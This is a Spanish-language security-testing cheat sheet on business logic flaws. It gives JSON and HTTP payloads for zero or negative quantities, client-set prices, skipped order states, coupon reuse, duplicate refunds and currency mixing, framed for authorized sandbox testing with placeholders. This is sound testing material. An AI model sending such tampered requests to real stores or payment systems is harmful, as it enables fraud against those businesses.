# 🗡️ Fallos de lógica de negocio: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Bordes de cantidad en sandbox

```json
{"productId":"{PRODUCTO_PROPIO}","quantity":0}
{"productId":"{PRODUCTO_PROPIO}","quantity":-1}
{"productId":"{PRODUCTO_PROPIO}","quantity":1}
```

**Cuándo usarlo:** Cada línea es una solicitud alternativa. Comparar importe y stock persistidos; no finalizar pagos reales.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).


### Campos calculados que deben derivarse en servidor

```json
{"productId":"{PRODUCTO_PROPIO}","quantity":1,"unitPrice":0.01}
{"itemId":"{ITEM_PROPIO}","quantity":1,"totalPrice":0}
{"cartId":"{CARRITO_PROPIO}","discountPercent":100}
```

**Cuándo usarlo:** Son alternativas para un modelo de prueba compatible; el eco del JSON no confirma que se haya usado el valor.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Business%20Logic%20Errors/README.md).


## 🧭 Payloads por contexto

### Saltos y repeticiones de estado

```text
POST /api/test-orders/{ID_PROPIO}/confirm  (sin paso previo)
POST /api/test-orders/{ID_PROPIO}/refund   (dos veces)
POST /api/test-coupons/{CODIGO_PROPIO}/redeem (en dos objetos propios)
```

**Cuándo usarlo:** Registrar estados antes/después y reglas documentadas; cada ruta se adapta al producto real.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).


## 🔥 Payloads avanzados

### Invariantes entre moneda, cuenta y workflow

```json
{"fromAccount":"{CUENTA_A}","toAccount":"{CUENTA_B}","amount":1,"currency":"TEST"}
{"itemId":"{ITEM_PROPIO}","currency":"TEST-B","amount":1}
{"orderId":"{ID_PROPIO}","status":"confirmed","paymentStatus":"pending"}
```

**Cuándo usarlo:** En un sandbox, comprobar que las transiciones y el valor contable respetan la política del negocio.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).


## 🔬 Pruebas guiadas por escenario

### 1. Cantidad cero

**Objetivo:** Comprobar una invariante de cantidad en carrito de laboratorio.

```json
{"productId":"{PRODUCTO_PROPIO}","quantity":0}
```

**Interpretación:** Verificar total, stock y pedido final; un 200 sin persistencia no prueba fallo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).

### 2. Cantidad negativa

**Objetivo:** Comprobar si el cálculo usa signo sin validarlo.

```json
{"productId":"{PRODUCTO_PROPIO}","quantity":-1}
```

**Interpretación:** No finalizar compras reales. Un total negativo solo es hallazgo si llega a una transacción o crédito no previsto.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors).

### 3. Precio aportado por cliente

**Objetivo:** Confirmar que el servidor recalcula el precio del catálogo.

```json
{"productId":"{PRODUCTO_PROPIO}","quantity":1,"unitPrice":0.01}
```

**Interpretación:** El backend debe ignorar el precio cliente. Comparar total en pedido de prueba, no solo eco JSON.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).

### 4. Salto de estado

**Objetivo:** Invocar la transición final sin el paso previo.

```http
POST /api/test-orders/{ID_PROPIO}/confirm HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
```

**Interpretación:** Registrar estado anterior y posterior; si la transición es permitida por diseño, no hay fallo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).

### 5. Reutilización de cupón

**Objetivo:** Verificar límite de un uso con dos objetos de prueba secuenciales.

```json
{"orderId":"{ID_PROPIO_2}","coupon":"{CUPON_DE_PRUEBA_YA_USADO}"}
```

**Interpretación:** Comprobar descuento final y regla documentada; no automatizar cupones de producción.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors).

### 6. Invariante entre cuentas propias

**Objetivo:** Comprobar si una operación se aplica al actor correcto.

```json
{"fromAccount":"{CUENTA_A}","toAccount":"{CUENTA_B}","amount":1,"currency":"TEST"}
```

**Interpretación:** Usar saldo simulado; validar autorización sobre ambas cuentas y reversibilidad.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).

### 7. Descuento acumulado

**Objetivo:** Verificar si dos promociones incompatibles se aplican juntas.

```json
{"cartId":"{CARRITO_PROPIO}","coupons":["{CUPON_A}","{CUPON_B}"]}
```

**Interpretación:** Confirmar política y total persistido en entorno de pruebas.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors).

### 8. Moneda y precio

**Objetivo:** Confirmar que el backend no mezcla importe de una moneda con otra.

```json
{"itemId":"{ITEM_PROPIO}","currency":"TEST-B","amount":1}
```

**Interpretación:** Usar divisas de laboratorio y comparar el total calculado por servidor; no procesar cobros reales.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).

### 9. Importe máximo documentado

**Objetivo:** En un sandbox con máximo 1000, probar el borde inmediato.

```json
{"testTransferId":"{ID_PROPIO}","amount":1001}
```

**Interpretación:** Adaptar 1001 al máximo del sandbox. Confirmar rechazo y ausencia de cambio de saldo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/logic-flaws).

### 10. Reembolso duplicado simulado

**Objetivo:** Comprobar una invariante de un solo reembolso por pedido propio.

```text
POST /api/test-orders/{ID_PROPIO}/refund
Control: GET /api/test-orders/{ID_PROPIO}/status
POST /api/test-orders/{ID_PROPIO}/refund
```

**Interpretación:** Hacerlo solo en sandbox de pagos. Dos respuestas 200 no implican dos créditos; verificar libro contable.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
